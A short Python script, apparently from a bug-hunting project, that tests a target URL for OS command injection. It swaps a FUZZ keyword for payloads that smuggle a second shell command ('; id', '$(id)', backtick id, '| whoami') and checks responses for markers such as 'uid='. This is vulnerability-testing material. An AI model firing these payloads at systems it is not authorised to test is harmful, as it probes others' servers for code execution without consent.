#!/usr/bin/env python3
"""
Cmd-Injection-Tester: A tool to identify OS Command Injection vulnerabilities.
Part of the Bughunt project (OWASP A03: Injection).
"""

import requests
import argparse
import os
import sys

# Payloads that trigger visible system commands
CMD_PAYLOADS = [
    "; id",
    "| id",
    "& id",
    "\n id",
    "; whoami",
    "| whoami",
    "& whoami",
    "$(id)",
    "`id`",
    "; ping -c 1 127.0.0.1",
    "| ping -c 1 127.0.0.1",
]

# Indicators of successful command injection
CMD_INDICATORS = [
    "uid=", "gid=", "groups=", # Output of 'id'
    "www-data", "root", "apache", # Common 'whoami' results
    "64 bytes from 127.0.0.1", # Output of 'ping'
]

def scan_cmd_injection(url):
    print(f"[*] Starting OS Command Injection scan on: {url}")
    
    if "FUZZ" not in url:
        print("[!] Error: No 'FUZZ' keyword found in URL.")
        return

    print(f"[*] Testing {len(CMD_PAYLOADS)} payloads...")

    found = []

    for payload in CMD_PAYLOADS:
        target = url.replace("FUZZ", payload)
        try:
            response = requests.get(target, timeout=5)
            
            for indicator in CMD_INDICATORS:
                if indicator in response.text:
                    print(f"\n[!] OS COMMAND INJECTION DETECTED!")
                    print(f"    Payload:   {payload}")
                    print(f"    Indicator: {indicator}")
                    print(f"    URL:       {target}\n")
                    found.append({"payload": payload, "indicator": indicator})
                    break
                    
        except Exception:
            pass

    if not found:
        print("[-] No OS Command Injection vulnerabilities detected.")
    
    return found

def main():
    parser = argparse.ArgumentParser(description="Cmd-Injection-Tester (OWASP A03)")
    parser.add_argument("url", help="Target URL with FUZZ keyword")

    args = parser.parse_args()
    scan_cmd_injection(args.url)

if __name__ == "__main__":
    main()
